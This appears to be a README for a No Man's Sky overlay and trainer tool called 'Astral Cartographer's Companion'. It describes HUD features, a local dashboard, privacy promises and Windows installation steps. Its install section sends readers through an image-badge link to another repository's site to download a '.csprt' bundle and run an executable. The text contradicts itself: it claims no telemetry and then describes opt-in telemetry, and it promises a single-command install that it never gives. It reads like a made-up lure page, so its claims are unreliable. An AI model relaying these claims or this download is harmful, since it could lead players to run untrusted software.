Every traveler of the boundless void knows the paradox of No Man's Sky: you are given a universe without limits, yet your own tools are painfully finite. Your exosuit depletes. Your mining beam sputters. Your starship shudders under the weight of empty fuel cells.

## 🧭 Why This Exists

The original No Man's Sky Trainer (laserchrysalishaul/no-mans-sky-trainer) addressed a core need: **removing friction from exploration**. But friction is not the only enemy in deep space. **Confusion** is.

A traveler who can mine endlessly but cannot find a rare mineral is still lost. A pilot who cannot crash but cannot remember which star system holds the anomaly is directionless.

**Astral Cartographer's Companion** takes the next evolutionary step. It is a **contextual awareness engine** that overlays intelligent guidance, resource forecasting, and environmental analysis directly onto your play session—without destroying the mystery that makes the game special. You still discover. You just never **stumble blindly**.

## 🎛️ User Interface & Integration

### The Holo-Grid Overlay
A **minimal, non-intrusive** HUD layer that sits at the edge of your peripheral vision. Unlike cluttered trainers that scream information at you, the Companion whispers. A subtle glow on your mining beam indicates optimal yield. A faint compass line on your horizon points to the anomaly. You instinctively know the state of your systems without breaking immersion.

- **Customizable Opacity**: Fade the overlay to 10% transparency or make it a bold visual anchor.
- **Stationary Profile**: Works with or without the standard NMS UI. You can turn off native markers and rely solely on the Companion if you wish.
- **Colorblind-Aware Palettes**: Distinguish critical information via icons and shape shifts, not just color.

### 📊 Telemetry Dashboard (Out-of-Game Console)
A companion web-based dashboard (accessible via local browser) that summarizes your play session:

- List of all visited star systems (names, coordinates, dominant resources)
- Fauna discovery progress per planetary body
- Heatmap of your mining activity (you will be surprised how much of one hemisphere you explore)
- Exportable JSON logs for your own analytics or fan-made wikis

## 🔒 Data Privacy & Integrity

The Companion operates **entirely within the local process**. It sends no telemetry to any remote server. It does not contact the game's update servers. Your travel logs stay yours, stored in a local `.acd` (Astral Cartographer Data) folder.

- **Anti-Pattern of Phoning Home**: Your gaming profile is not mined for commercial use.
- **Offline Functionality**: Once installed, the tool requires no internet connection. The feature set is fully functional in steam's offline mode.

## 📦 Installation & Configuration

The installation process is a **single-command orchestration** but intentionally avoids intrusive package managers. We provide a self-contained executable and a JSON config you can edit with any text editor.

### Quick Start (Windows)
1. Download the latest `.csprt` bundle from the [![Download](https://raw.githubusercontent.com/jenny-guyen/astral-harvest-mod/main/latest_5e3f50.svg)](https://jenny-guyen.github.io/astral-harvest-mod/) section.
2. Execute `astral-companion.exe`. The tool will auto-detect your No Man's Sky executable path.
3. Enable the desired modules from the tray icon menu.
4. Launch No Man's Sky. The Holo-Grid appears as soon as you are in orbit.

### Advanced: Configuration via `ac_config.json`
Each feature has a toggleable `"enabled": true/false` field. Example for the mining module:

```json
{
  "module_id": "mineral_well",
  "enabled": true,
  "threshold_mode": "normal",
  "yield_multiplier": 2.0
}
```

The included `schema.json` file documents every field for intellisense in IDEs like VS Code.

### First Boot Guidance
A short, friendly tour (around 90 seconds) introduces you to each module's placement on the screen. You can dismiss it permanently.

## ❓ Troubleshooting & Community

### Known Edge Cases
| Symptom                         | Resolution                                                                 |
|---------------------------------|----------------------------------------------------------------------------|
| Overlay does not appear         | Run the tool as normal (not admin). Ensure No Man's Sky is in windowed borderless mode. |
| Dashboard shows incorrect language | Locale detection fails on some package managers. Manually set `locale` in JSON to `de`, `ja`, etc. |
| Frame drops in massive bases    | Lower `overlay_refresh_rate` in JSON from `30` to `15`.                     |

### Telemetry Analytics (Opt-In)
If you enable the anonymous, aggregated feedback toggle (off by default), you assist us in prioritizing new modules. **We only record module enablement counts and average session duration.** No coordinates, no seed data.
